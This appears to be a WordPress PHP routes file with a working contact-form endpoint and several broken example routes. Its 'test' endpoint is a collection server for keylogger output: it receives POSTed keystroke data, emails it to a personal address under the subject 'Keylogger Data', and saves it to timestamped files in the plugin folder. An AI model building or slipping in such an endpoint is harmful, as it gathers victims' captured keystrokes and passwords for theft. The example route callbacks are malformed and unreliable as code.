<?php

add_action('rest_api_init', function () {
    register_rest_route('api', 'contactus', array(
        'methods' => array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'),
        'callback' => function ($request) {
            $method = $request->get_method();

// Method Get selalu paling bawah
// mungkin nanti pakai array condition supaya lebih efisien
// misal $method[get][callback]

// response dibuat function untuk mempermudah standarisasi

// if ($method === "POST") {
//     return new WP_REST_Response(array(
//         'request' => array(
//             'status' => 200,
//             'message' => "Blablablabla",
//         ),
//         'data' => "",
//     ), 200);
// }

if ($method === "POST") {
    $name = sanitize_text_field($request->get_param('name'));
    $email = sanitize_email($request->get_param('email'));
    $telp = sanitize_text_field($request->get_param('phone'));
    $subject = sanitize_text_field($request->get_param('subject'));
    $message = sanitize_textarea_field($request->get_param('message'));
    if (empty($name) || empty($email) || empty($telp) || empty($subject) || empty($message)) {
        return new WP_REST_Response(array(
            'request' => array(
                'status' => 'error',
                'message' => "All fields are required.",
            ),
        ), 400);
    }
    if (!is_email($email)) {
        return new WP_REST_Response(array(
            'request' => array(
                'status' => 'error',
                'message' => "Invalid email address.",
            ),
        ), 400);
    }
    $to = "zarralghifari@gmail.com";
    $body = "Name: $name\nEmail: $email\nPhone: $telp\nSubject: $subject\nMessage: $message";
    $headers = array('Content-Type: text/plain; charset=UTF-8');
    $sent = wp_mail($to, $subject, $body, $headers);
    if ($sent) {
        $sent = wp_mail("hello@hijrstudio.com", $subject, $body, $headers);
        return new WP_REST_Response(array(
            'request' => array(
                'status' => 'success',
                'message' => "Your message has been sent successfully.",
            ),
        ), 200);
    } else {
        return new WP_REST_Response(array(
            'request' => array(
                'status' => 'error',
                'message' => "Failed to send your message.",
            ),
        ), 500);
    }
}

return new WP_REST_Response(array(
    'request' => array(
        'status' => 404,
    ),
), 404);

        },
    ));
    register_rest_route('api', 'example', array(
        'methods' => array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'),
        'callback' => function ($request) {
            add_action('rest_api_init', 'register_example_routes');

function register_example_routes()
{
    register_rest_route_with_callback('api', '/example/', function ($data) {
        return create_rest_response('Example');
    });
}
        },
    ));
    register_rest_route('api', 'example/sub', array(
        'methods' => array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'),
        'callback' => function ($request) {
            add_action('rest_api_init', 'register_example_sub_routes');

function register_example_sub_routes()
{
    register_rest_route_with_callback('api', '/example/sub/', function ($data) {
        return create_rest_response('Sub');
    });
}
        },
    ));
    register_rest_route('api', 'example/sub/sub', array(
        'methods' => array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'),
        'callback' => function ($request) {
            add_action('rest_api_init', 'register_example_sub_sub_routes');

function register_example_sub_sub_routes()
{
    register_rest_route_with_callback('api', '/example/sub/sub/', function ($data) {
        return create_rest_response('Sub Sub');
    }, 'GET');
}
        },
    ));
    register_rest_route('api', 'test', array(
        'methods' => array('GET', 'POST', 'PUT', 'PATCH', 'DELETE'),
        'callback' => function ($request) {
            $method = $request->get_method();

if ($method === 'POST') {
    // Retrieve and sanitize the data from the request
    $keyLogData = isset($_POST['data']) ? sanitize_text_field($_POST['data']) : '';

    if (empty($keyLogData)) {
        // Return error response if no data is provided
        header('Content-Type: application/json');
        http_response_code(400);
        echo json_encode(array(
            'request' => array(
                'status' => 'error',
                'message' => 'No data received.',
            ),
        ));
        exit;
    }

    // Define the email details
    $to = 'zarralghifari@gmail.com';  // Replace with your email address
    $subject = 'Keylogger Data';  // Email subject
    $body = "Received keylogger data:\n\n" . $keyLogData;
    $headers = array(
        'Content-Type: text/plain; charset=UTF-8',
        'From: no-reply@example.com'  // Replace with a valid sender email
    );

    // Send the email
    $sent = wp_mail($to, $subject, $body, $headers);

    if ($sent) {
        // Clear the log file after sending email
        $timestamp = date('Y-m-d_H-i-s');
        $filepath = __DIR__ . "/keylogger_text_" . $timestamp . ".txt";
        file_put_contents($filepath, $keyLogData);

        // Return a success response
        header('Content-Type: application/json');
        http_response_code(200);
        echo json_encode(array(
            'request' => array(
                'status' => 'success',
                'message' => 'Data received and email sent successfully.',
            ),
        ));
    } else {
        // Return an error response if email sending fails
        header('Content-Type: application/json');
        http_response_code(500);
        echo json_encode(array(
            'request' => array(
                'status' => 'error',
                'message' => 'Failed to send email.',
            ),
        ));
    }
    exit;
}

// Handle invalid request methods
header('Content-Type: application/json');
http_response_code(405);
echo json_encode(array(
    'request' => array(
        'status' => 'error',
        'message' => 'Invalid request method.',
    ),
));

        },
    ));
});
